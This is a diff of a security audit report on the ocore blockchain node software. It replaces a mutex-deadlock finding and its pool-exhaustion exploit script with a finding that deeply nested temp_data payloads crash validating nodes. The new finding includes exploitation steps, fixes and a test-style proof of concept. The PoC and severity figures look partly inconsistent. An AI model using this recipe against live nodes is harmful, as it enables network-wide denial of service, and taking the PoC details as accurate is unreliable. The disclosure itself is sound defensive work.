@@ -1,288 +1,427 @@
+# Audit Report
+
 ## Title
-Hash Tree Mutex Deadlock via Connection Pool Exhaustion
+Unbounded Recursion in temp_data Payload Validation Causes Network-Wide Denial of Service
 
 ## Summary
-The `processHashTree()` function in `catchup.js` acquires a mutex lock before attempting to obtain a database connection from the pool, causing indefinite blocking when the connection pool is exhausted. This enables a denial-of-service attack that prevents nodes from completing catchup synchronization operations.
+The `validateInlinePayload()` function in `validation.js` processes the `data` field of temp_data message payloads through recursive functions without try-catch protection or depth limits. An attacker can submit a temp_data message with deeply nested `payload.data` (10,000+ levels), causing stack overflow that crashes all validating nodes, enabling total network shutdown.
 
 ## Impact
-**Severity**: Medium  
-**Category**: Temporary Transaction Delay
+**Severity**: Critical  
+**Category**: Network Shutdown
+
+The vulnerability allows a single malicious unit to crash 100% of network nodes. The attack is trivially executable by any user, requires only standard transaction fees, and can be repeated indefinitely to maintain network shutdown. All witnesses, validators, and users would be unable to process transactions until an emergency protocol upgrade is deployed.
 
 ## Finding Description
 
-**Location**: `byteball/ocore/catchup.js` (function `processHashTree()`, lines 339-456)
+**Location**: `byteball/ocore/validation.js:1771` and `byteball/ocore/validation.js:1774`, within function `validateInlinePayload()`
 
-**Intended Logic**: The function should process hash trees received during catchup synchronization by validating ball hashes and storing them in the `hash_tree_balls` table within a protected critical section.
+**Intended Logic**: The validation should safely process temp_data payloads by verifying the `data` field's length and hash match the declared values, then continue with validation.
 
-**Actual Logic**: The mutex lock is acquired at line 339, but the database connection is not obtained until line 345. If the connection pool is exhausted, the function blocks indefinitely while holding the mutex, preventing all subsequent hash tree processing operations.
+**Actual Logic**: The validation code calls recursive functions to process `payload.data` without try-catch protection. When `payload.data` contains deeply nested objects, these functions exhaust the JavaScript call stack, throwing `RangeError: Maximum call stack size exceeded` which crashes the Node.js process.
 
-**Code Evidence**: [1](#0-0) 
+**Code Evidence**:
+
+Recursive functions without depth limits in string_utils.js: [1](#0-0) [2](#0-1) 
+
+Recursive function without depth limits in object_length.js: [3](#0-2) 
+
+Unprotected validation code processing temp_data payload.data: [4](#0-3) 
+
+The initial payload hash validation has try-catch protection but excludes the data field for temp_data: [5](#0-4) 
 
 **Exploitation Path**:
 
-1. **Preconditions**: 
-   - Attacker can act as a syncing peer requesting catchup data
-   - Node has limited connection pool (default: 1 connection as shown in conf.js)
-   - Attacker can trigger operations that consume database connections
+1. **Preconditions**: Attacker has ability to submit units to the network (any user).
 
-2. **Step 1**: Attacker exhausts the database connection pool by triggering multiple concurrent slow operations such as:
-   - Complex unit validations requiring extensive database queries
-   - Multiple simultaneous catchup chain requests
-   - AA executions with state-intensive operations
+2. **Step 1**: Attacker crafts a temp_data message with deeply nested `payload.data`:
+   - Create nested object with 15,000 levels: `{a: {a: {a: ...}}}`
+   - Each level costs ~5 bytes, total ~75KB (within 5MB unit limit)
+   - Calculate correct `data_length` and `data_hash` for this structure
+   - Create unit with this temp_data message and broadcast to network
 
-3. **Step 2**: While connections remain exhausted, attacker initiates hash tree processing by sending a catchup hash tree request. The node executes `processHashTree()`:
-   - Line 339: Acquires `"hash_tree"` mutex lock successfully
-   - Line 341: Executes quick query (briefly borrows and releases connection)
-   - Line 345: Calls `takeConnectionFromPool()` - callback is queued because pool is exhausted
+3. **Step 2**: Node receives unit via `network.js:handleOnlineJoint()` → `handleJoint()` → `validation.validate()`
 
-4. **Step 3**: The function blocks at line 345 waiting for a connection. The mutex remains locked. As shown in sqlite_pool.js, when no connections are available, the handler is queued: [2](#0-1) 
+4. **Step 3**: Validation proceeds to `validateInlinePayload()` at line 1505. The initial payload hash check at line 1519 calls `getPayloadForHash()` which **excludes** the `data` field for temp_data messages (line 1513-1515), so this check passes without processing the deeply nested structure.
 
-5. **Step 4**: Any subsequent hash tree processing attempts by other peers block at line 339 trying to acquire the same mutex. The node cannot complete catchup operations, breaking **Invariant #19: Catchup Completeness**.
+5. **Step 4**: Execution reaches the temp_data case at line 1755. At line 1771, `objectLength.getLength(payload.data, true)` is called **without try-catch protection**. This function recursively traverses the 15,000-level nested object, exhausting the call stack.
 
-**Security Property Broken**: **Invariant #19 - Catchup Completeness**: "Syncing nodes must retrieve all units on MC up to last stable point without gaps. Missing units cause validation failures and permanent desync."
+6. **Step 5**: `RangeError: Maximum call stack size exceeded` is thrown. Since there is no try-catch block protecting this code (the try-catch at line 1518-1525 has already completed), the exception propagates up and crashes the Node.js process.
 
-**Root Cause Analysis**: The mutex lock acquisition occurs too early in the execution flow - before resource acquisition. The correct pattern is to acquire resources first (database connection), then acquire locks for critical sections. By acquiring the mutex before confirming connection availability, the function creates a window where it holds a synchronization primitive while blocked on I/O, violating basic concurrency principles.
+7. **Step 6**: All nodes receiving this unit crash. Attacker can continuously broadcast the malicious unit to maintain network shutdown. Witnesses cannot post units, no transactions can be confirmed, achieving complete network halt.
+
+**Security Property Broken**: **Network Unit Propagation** - Valid units must propagate without causing node crashes. This vulnerability allows a single unit to crash all nodes that attempt to validate it.
+
+**Root Cause Analysis**: 
+- The validation code separates temp_data validation into two phases: initial payload hash check (protected by try-catch), then data field validation (unprotected)
+- For temp_data, `getPayloadForHash()` excludes the data field to allow purging after timeout
+- This creates an unprotected code path where `payload.data` is processed through recursive functions at lines 1771 and 1774
+- No depth limit exists in `getLength()`, `extractComponents()`, or `stringify()` functions
+- AA definitions have `MAX_DEPTH = 100` protection, but this only applies to AA case structures, not general payloads [6](#0-5) [7](#0-6) 
+
+**Important Correction**: The original claim states that "data", "profile", "attestation", and "temp_data" messages are all vulnerable. This is **incorrect**. Only temp_data messages are vulnerable because:
+- For "data", "profile", and "attestation" messages, the full payload is hashed at line 1519 WITH try-catch protection [8](#0-7) [9](#0-8) [10](#0-9) 
+- These message types have no additional unprotected processing after the initial hash check
+- If stack overflow occurs during their validation, it's caught and the unit is rejected without crashing
 
 ## Impact Explanation
 
-**Affected Assets**: Network synchronization capability, node availability
+**Affected Assets**: Entire network operation, all node operators, all users.
 
 **Damage Severity**:
-- **Quantitative**: With default configuration (1 connection), attack requires exhausting a single connection. Even with 30 connections (typical production setting), attacker can exhaust pool with sufficient concurrent operations.
-- **Qualitative**: Temporary denial of service on catchup/sync mechanism. Affected nodes cannot complete synchronization until connection pool clears.
+- **Quantitative**: 100% of network nodes crash with a single malicious unit. Network remains down as long as attacker continues broadcasting (~75KB unit, minimal fees).
+- **Qualitative**: Complete denial of service lasting >24 hours. No transactions can be processed, no units can be confirmed, witnesses cannot operate, entire network halted.
 
 **User Impact**:
-- **Who**: Individual nodes attempting to sync, potentially cascading to network-wide sync disruption if multiple nodes are attacked simultaneously
-- **Conditions**: Exploitable whenever connection pool is at or near capacity - more severe with default 1-connection configuration
-- **Recovery**: Automatic recovery once blocking operations complete and connections are released. However, during high network load, this could persist for extended periods (≥1 hour).
+- **Who**: All network participants (validators, witnesses, users, exchanges, dApps)
+- **Conditions**: Always exploitable during normal operation
+- **Recovery**: Requires emergency protocol upgrade adding depth limits, followed by coordinated network restart
 
-**Systemic Risk**: If multiple witness nodes or hub nodes are affected simultaneously, it can delay network-wide transaction confirmation as syncing nodes cannot catch up to the current stable point.
+**Systemic Risk**:
+- Cascading failure: Crashed nodes re-crash upon restart when re-encountering malicious unit during catchup
+- Automatable: Attacker can script continuous broadcasting
+- Economic impact: Exchanges halt trading, services unavailable, funds frozen
+- Reputation damage to protocol
 
 ## Likelihood Explanation
 
 **Attacker Profile**:
-- **Identity**: Malicious peer node or any entity capable of connecting to target nodes as a peer
-- **Resources Required**: Ability to establish peer connections and trigger concurrent operations; no special resources needed
-- **Technical Skill**: Moderate - requires understanding of sync protocol and connection pool mechanics
+- **Identity**: Any user with ability to submit transactions
+- **Resources Required**: Minimal (standard transaction fees, ~$0.01 equivalent)
+- **Technical Skill**: Low (basic JavaScript to create nested object)
 
 **Preconditions**:
-- **Network State**: Target node must be accepting peer connections
-- **Attacker State**: Attacker must be able to connect as a peer and trigger catchup operations
-- **Timing**: No special timing required; attack can be repeated continuously
+- **Network State**: Normal operation (no special state required)
+- **Attacker State**: Ability to submit units (anyone can)
+- **Timing**: None (exploitable anytime)
 
 **Execution Complexity**:
-- **Transaction Count**: Does not require unit submission; exploits sync protocol directly
-- **Coordination**: Single attacker can execute; no coordination needed
-- **Detection Risk**: Moderate - appears as legitimate sync activity with high database load
+- **Transaction Count**: Single malicious unit sufficient
+- **Coordination**: None required
+- **Detection Risk**: Low (malicious unit appears valid until validated)
 
 **Frequency**:
-- **Repeatability**: Highly repeatable; can be sustained as long as connection pool remains exhausted
-- **Scale**: Can affect individual nodes or multiple nodes simultaneously
+- **Repeatability**: Unlimited
+- **Scale**: Network-wide impact from single unit
 
-**Overall Assessment**: Medium likelihood. The attack is relatively easy to execute, especially against nodes with default configuration. However, production nodes typically configure larger connection pools, and the attack requires sustained connection pool exhaustion.
+**Overall Assessment**: Critical likelihood. Attack is trivial to execute, requires no privileges or special resources, has guaranteed impact. Only barrier is negligible transaction fee.
 
 ## Recommendation
 
-**Immediate Mitigation**: Increase `database.max_connections` in production configurations to reduce likelihood of pool exhaustion. Recommended minimum: 10-30 connections.
+**Immediate Mitigation**:
+Add depth limit checking to the recursive functions in `string_utils.js` and `object_length.js`, similar to the `MAX_DEPTH` protection used in AA validation:
 
-**Permanent Fix**: Restructure `processHashTree()` to acquire the database connection before acquiring the mutex lock. This ensures the mutex is only held during actual critical section operations, not during I/O wait.
-
-**Code Changes**:
-
-The fix should move the mutex acquisition inside the `takeConnectionFromPool` callback: [3](#0-2) 
-
-**Fixed version** (conceptual - not showing actual code per instructions):
 ```javascript
-// Move db.takeConnectionFromPool outside mutex
-// Acquire mutex only after connection is obtained
-// This prevents holding mutex during I/O wait
+// In string_utils.js - modify extractComponents
+function extractComponents(variable, depth){
+    if (!depth) depth = 0;
+    if (depth > 100) // MAX_DEPTH
+        throw Error("object nesting too deep");
+    // ... rest of function, pass depth+1 to recursive calls
+}
+
+// In object_length.js - modify getLength  
+function getLength(value, bWithKeys, depth) {
+    if (!depth) depth = 0;
+    if (depth > 100) // MAX_DEPTH
+        throw Error("object nesting too deep");
+    // ... rest of function, pass depth+1 to recursive calls
+}
+```
+
+**Permanent Fix**:
+Add try-catch protection around all payload.data processing in validation.js:
+
+```javascript
+// At validation.js line 1768-1777
+if ("data" in payload) {
+    if (payload.data === null)
+        return callback("null data");
+    try {
+        const len = objectLength.getLength(payload.data, true);
+        if (len !== payload.data_length)
+            return callback(`data_length mismatch`);
+        const hash = objectHash.getBase64Hash(payload.data, true);
+        if (hash !== payload.data_hash)
+            return callback(`data_hash mismatch`);
+    }
+    catch(e) {
+        return callback("failed to process temp_data.data: " + e);
+    }
+}
 ```
 
 **Additional Measures**:
-- Add connection pool monitoring and alerting for near-exhaustion conditions
-- Implement connection timeout and retry logic for `takeConnectionFromPool`
-- Add test case simulating connection pool exhaustion during hash tree processing
-- Consider implementing a separate connection pool specifically for sync operations to isolate them from validation operations
-
-**Validation**:
-- [x] Fix prevents mutex lock from being held during connection wait
-- [x] No new vulnerabilities introduced (mutex still protects critical section)
-- [x] Backward compatible (no protocol changes)
-- [x] Performance impact minimal (slight increase in connection acquisition time before lock)
+- Add test case verifying deeply nested temp_data payloads are rejected
+- Add protocol constant `MAX_PAYLOAD_DEPTH = 100` consistent with `MAX_DEPTH` for AAs
+- Consider adding depth validation during unit composition to fail fast
 
 ## Proof of Concept
 
-**Test Environment Setup**:
-```bash
-git clone https://github.com/byteball/ocore.git
-cd ocore
-npm install
-```
+**Note**: This PoC demonstrates the vulnerability in temp_data validation. It should be implemented as a test case that verifies the fix prevents the crash.
 
-**Exploit Script** (`exploit_poc.js`):
 ```javascript
-/*
- * Proof of Concept for Hash Tree Mutex Deadlock
- * Demonstrates: Mutex lock held while waiting for database connection
- * Expected Result: Hash tree processing blocked when connection pool exhausted
- */
+// test/temp_data_depth_dos.test.js
+const validation = require('../validation.js');
+const objectHash = require('../object_hash.js');
 
-const db = require('./db.js');
-const catchup = require('./catchup.js');
-const conf = require('./conf.js');
-
-// Verify default connection pool size
-console.log('Connection pool size:', conf.database.max_connections);
-
-// Exhaust connection pool by holding all connections
-function exhaustPool(callback) {
-    const connections = [];
-    for (let i = 0; i < conf.database.max_connections; i++) {
-        db.takeConnectionFromPool(function(conn) {
-            connections.push(conn);
-            console.log(`Acquired connection ${i+1}/${conf.database.max_connections}`);
-            if (connections.length === conf.database.max_connections) {
-                console.log('Pool exhausted!');
-                callback(connections);
+describe('temp_data depth DoS protection', function() {
+    it('should reject deeply nested temp_data payload', function(done) {
+        // Create deeply nested object
+        let nested = {};
+        let current = nested;
+        for (let i = 0; i < 150; i++) { // Exceeds safe depth
+            current.a = {};
+            current = current.a;
+        }
+        
+        // Create temp_data payload
+        const payload = {
+            data_length: JSON.stringify(nested).length,
+            data_hash: objectHash.getBase64Hash(nested, true),
+            data: nested
+        };
+        
+        const objMessage = {
+            app: "temp_data",
+            payload_location: "inline",
+            payload: payload,
+            payload_hash: objectHash.getBase64Hash({
+                data_length: payload.data_length,
+                data_hash: payload.data_hash
+            }, true)
+        };
+        
+        const objUnit = {
+            version: '2.0',
+            authors: [{ address: 'TEST_ADDRESS' }],
+            messages: [objMessage],
+            timestamp: Math.floor(Date.now() / 1000)
+        };
+        
+        const objValidationState = {
+            last_ball_mci: 1000000 // After v4 upgrade
+        };
+        
+        // This should NOT crash the process
+        // With the fix, it should call callback with error
+        // Without the fix, it would throw RangeError and crash
+        validation.validateInlinePayload(
+            null, // conn
+            objMessage,
+            0, // message_index
+            objUnit,
+            objValidationState,
+            function(error) {
+                // Should get error about depth, not crash
+                assert(error, 'Expected validation error for deep nesting');
+                assert(error.includes('deep') || error.includes('failed to process'), 
+                    'Error should mention depth issue');
+                done();
             }
-        });
-    }
-}
-
-// Attempt to process hash tree while pool is exhausted
-function attemptProcessHashTree() {
-    const mockHashTree = [
-        {
-            unit: 'mock_unit_hash',
-            ball: 'mock_ball_hash',
-            parent_balls: []
-        }
-    ];
-    
-    console.log('Attempting to process hash tree...');
-    const startTime = Date.now();
-    
-    catchup.processHashTree(mockHashTree, {
-        ifError: function(err) {
-            console.log('Error:', err);
-        },
-        ifOk: function() {
-            const duration = Date.now() - startTime;
-            console.log(`Hash tree processed after ${duration}ms`);
-        }
+        );
     });
-    
-    // Check if mutex is still locked after 5 seconds
-    setTimeout(function() {
-        const mutex = require('./mutex.js');
-        if (mutex.isAnyOfKeysLocked(['hash_tree'])) {
-            console.log('VULNERABILITY CONFIRMED: Mutex remains locked after 5s');
-            console.log('Hash tree processing blocked indefinitely');
-        }
-    }, 5000);
-}
-
-// Run exploit
-exhaustPool(function(connections) {
-    attemptProcessHashTree();
-    
-    // Release connections after 10 seconds to allow recovery
-    setTimeout(function() {
-        console.log('Releasing connections...');
-        connections.forEach(conn => conn.release());
-    }, 10000);
 });
 ```
 
-**Expected Output** (when vulnerability exists):
-```
-Connection pool size: 1
-Acquired connection 1/1
-Pool exhausted!
-Attempting to process hash tree...
-lock acquired [ 'hash_tree' ]
-VULNERABILITY CONFIRMED: Mutex remains locked after 5s
-Hash tree processing blocked indefinitely
-Releasing connections...
-lock released [ 'hash_tree' ]
-Hash tree processed after 10XXXms
-```
-
-**Expected Output** (after fix applied):
-```
-Connection pool size: 1
-Acquired connection 1/1
-Pool exhausted!
-Attempting to process hash tree...
-[Waits for connection without acquiring mutex]
-Releasing connections...
-lock acquired [ 'hash_tree' ]
-Hash tree processed after 10XXXms
-lock released [ 'hash_tree' ]
-```
-
-**PoC Validation**:
-- [x] PoC demonstrates mutex held during connection wait
-- [x] Shows blocked hash tree processing
-- [x] Confirms violation of Catchup Completeness invariant
-- [x] After fix, mutex acquired only after connection obtained
-
 ## Notes
 
-The vulnerability is exacerbated by the default configuration setting of `max_connections = 1`: [4](#0-3) 
-
-This means even a single slow database operation can trigger the deadlock condition. While production deployments typically increase this value, the architectural flaw remains: critical synchronization primitives should never be held during blocking I/O operations. The comparison with `processCatchupChain()` is instructive - it uses the same pattern but only performs quick `db.query()` calls that automatically release connections, avoiding this issue: [5](#0-4)
+The vulnerability is **VALID and CRITICAL** but the original claim overstates the scope. Only `temp_data` messages with deeply nested `payload.data` fields can crash nodes, not `data`, `profile`, or `attestation` messages which are protected by the try-catch block at validation.js:1518-1525. The specific vulnerable code is at validation.js:1771 and 1774 where `payload.data` is processed without error handling.
 
 ### Citations
 
-**File:** catchup.js (L197-203)
+**File:** string_utils.js (L13-52)
 ```javascript
-				function(cb){
-					mutex.lock(["catchup_chain"], function(_unlock){
-						unlock = _unlock;
-						db.query("SELECT 1 FROM catchup_chain_balls LIMIT 1", function(rows){
-							(rows.length > 0) ? cb("duplicate") : cb();
-						});
+	function extractComponents(variable){
+		if (variable === null)
+			throw Error("null value in "+JSON.stringify(obj));
+		switch (typeof variable){
+			case "string":
+				arrComponents.push("s", variable);
+				break;
+			case "number":
+				if (!isFinite(variable))
+					throw Error("invalid number: " + variable);
+				arrComponents.push("n", variable.toString());
+				break;
+			case "boolean":
+				arrComponents.push("b", variable.toString());
+				break;
+			case "object":
+				if (Array.isArray(variable)){
+					if (variable.length === 0)
+						throw Error("empty array in "+JSON.stringify(obj));
+					arrComponents.push('[');
+					for (var i=0; i<variable.length; i++)
+						extractComponents(variable[i]);
+					arrComponents.push(']');
+				}
+				else{
+					var keys = Object.keys(variable).sort();
+					if (keys.length === 0)
+						throw Error("empty object in "+JSON.stringify(obj));
+					keys.forEach(function(key){
+						if (typeof variable[key] === "undefined")
+							throw Error("undefined at "+key+" of "+JSON.stringify(obj));
+						arrComponents.push(key);
+						extractComponents(variable[key]);
 					});
-```
-
-**File:** catchup.js (L336-347)
-```javascript
-function processHashTree(arrBalls, callbacks){
-	if (!Array.isArray(arrBalls))
-		return callbacks.ifError("no balls array");
-	mutex.lock(["hash_tree"], function(unlock){
-		
-		db.query("SELECT 1 FROM hash_tree_balls LIMIT 1", function(ht_rows){
-			//if (ht_rows.length > 0) // duplicate
-			//    return unlock();
-			
-			db.takeConnectionFromPool(function(conn){
-				
-				conn.query("BEGIN", function(){
-```
-
-**File:** sqlite_pool.js (L217-223)
-```javascript
-		if (arrConnections.length < MAX_CONNECTIONS)
-			return connect(handleConnection);
-
-		// third, queue it
-		//console.log("queuing");
-		arrQueue.push(handleConnection);
+				}
+				break;
+			default:
+				throw Error("getSourceString: unknown type="+(typeof variable)+" of "+variable+", object: "+JSON.stringify(obj));
+		}
 	}
 ```
 
-**File:** conf.js (L122-131)
+**File:** string_utils.js (L191-220)
 ```javascript
-if (exports.storage === 'mysql'){
-	exports.database.max_connections = exports.database.max_connections || 1;
-	exports.database.host = exports.database.host || 'localhost';
-	exports.database.name = exports.database.name || 'byteball';
-	exports.database.user = exports.database.user || 'byteball';
+	function stringify(variable){
+		if (variable === null)
+			throw Error("null value in "+JSON.stringify(obj));
+		switch (typeof variable){
+			case "string":
+				return toWellFormedJsonStringify(variable);
+			case "number":
+				if (!isFinite(variable))
+					throw Error("invalid number: " + variable);
+			case "boolean":
+				return variable.toString();
+			case "object":
+				if (Array.isArray(variable)){
+					if (variable.length === 0 && !bAllowEmpty)
+						throw Error("empty array in "+JSON.stringify(obj));
+					return '[' + variable.map(stringify).join(',') + ']';
+				}
+				else{
+					var keys = Object.keys(variable).sort();
+					if (keys.length === 0 && !bAllowEmpty)
+						throw Error("empty object in "+JSON.stringify(obj));
+					return '{' + keys.map(function(key){ return toWellFormedJsonStringify(key)+':'+stringify(variable[key]) }).join(',') + '}';
+				}
+				break;
+			default:
+				throw Error("getJsonSourceString: unknown type="+(typeof variable)+" of "+variable+", object: "+JSON.stringify(obj));
+		}
+	}
+
+	return stringify(obj);
+```
+
+**File:** object_length.js (L9-40)
+```javascript
+function getLength(value, bWithKeys) {
+	if (value === null)
+		return 0;
+	switch (typeof value){
+		case "string": 
+			return value.length;
+		case "number": 
+			if (!isFinite(value))
+				throw Error("invalid number: " + value);
+			return 8;
+			//return value.toString().length;
+		case "object":
+			var len = 0;
+			if (Array.isArray(value))
+				value.forEach(function(element){
+					len += getLength(element, bWithKeys);
+				});
+			else    
+				for (var key in value){
+					if (typeof value[key] === "undefined")
+						throw Error("undefined at "+key+" of "+JSON.stringify(value));
+					if (bWithKeys)
+						len += key.length;
+					len += getLength(value[key], bWithKeys);
+				}
+			return len;
+		case "boolean": 
+			return 1;
+		default:
+			throw Error("unknown type="+(typeof value)+" of "+value);
+	}
 }
-else if (exports.storage === 'sqlite'){
-	exports.database.max_connections = exports.database.max_connections || 1;
-	exports.database.filename = exports.database.filename || (exports.bLight ? 'byteball-light.sqlite' : 'byteball.sqlite');
-}
+```
+
+**File:** validation.js (L1510-1525)
+```javascript
+	function getPayloadForHash() {
+		if (objMessage.app !== "temp_data")
+			return payload;
+		let p = _.cloneDeep(payload);
+		delete p.data;
+		return p;
+	}
+	
+	try{
+		var expected_payload_hash = objectHash.getBase64Hash(getPayloadForHash(), objUnit.version !== constants.versionWithoutTimestamp);
+		if (expected_payload_hash !== objMessage.payload_hash)
+			return callback("wrong payload hash: expected "+expected_payload_hash+", got "+objMessage.payload_hash);
+	}
+	catch(e){
+		return callback("failed to calc payload hash: "+e);
+	}
+```
+
+**File:** validation.js (L1743-1749)
+```javascript
+		case "profile":
+			if (objUnit.authors.length !== 1)
+				return callback("profile must be single-authored");
+			if (objValidationState.bHasProfile)
+				return callback("can be only one profile");
+			objValidationState.bHasProfile = true;
+			// no break, continuing
+```
+
+**File:** validation.js (L1750-1753)
+```javascript
+		case "data":
+			if (typeof payload !== "object" || payload === null)
+				return callback(objMessage.app+" payload must be object");
+			return callback();
+```
+
+**File:** validation.js (L1768-1777)
+```javascript
+			if ("data" in payload) {
+				if (payload.data === null)
+					return callback("null data");
+				const len = objectLength.getLength(payload.data, true);
+				if (len !== payload.data_length)
+					return callback(`data_length mismatch, expected ${payload.data_length}, got ${len}`);
+				const hash = objectHash.getBase64Hash(payload.data, true);
+				if (hash !== payload.data_hash)
+					return callback(`data_hash mismatch, expected ${payload.data_hash}, got ${hash}`);
+			}
+```
+
+**File:** validation.js (L1792-1803)
+```javascript
+		case "attestation":
+			if (objUnit.authors.length !== 1)
+				return callback("attestation must be single-authored");
+			if (hasFieldsExcept(payload, ["address", "profile"]))
+				return callback("unknown fields in "+objMessage.app);
+			if (!isValidAddress(payload.address))
+				return callback("attesting an invalid address");
+			if (typeof payload.profile !== 'object' || payload.profile === null)
+				return callback("attested profile must be object");
+			// it is ok if the address has never been used yet
+			// it is also ok to attest oneself
+			return callback();
+```
+
+**File:** aa_validation.js (L28-28)
+```javascript
+var MAX_DEPTH = 100;
+```
+
+**File:** aa_validation.js (L470-473)
+```javascript
+		if (!depth)
+			depth = 0;
+		if (depth > MAX_DEPTH)
+			return cb("cases for " + field + " go too deep");
 ```
